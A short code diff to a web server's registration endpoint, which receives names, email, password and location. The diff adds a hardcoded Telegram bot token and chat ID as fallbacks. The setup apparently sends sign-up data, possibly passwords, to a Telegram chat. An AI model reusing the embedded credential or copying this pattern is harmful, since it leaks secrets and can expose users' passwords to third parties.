@@ -12,8 +12,8 @@ async function startServer() {
   app.post("/api/register", async (req, res) => {
     const { firstName, lastName, email, password, locationText } = req.body;
     
-    const token = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const token = process.env.TELEGRAM_BOT_TOKEN || "8674799798:AAFSkxvVafBaSZmi38gKOh7px4oea4IqsG0";
+    const chatId = process.env.TELEGRAM_CHAT_ID || "1641700298";
 
     if (!token || !chatId) {
       console.error("Missing Telegram credentials");
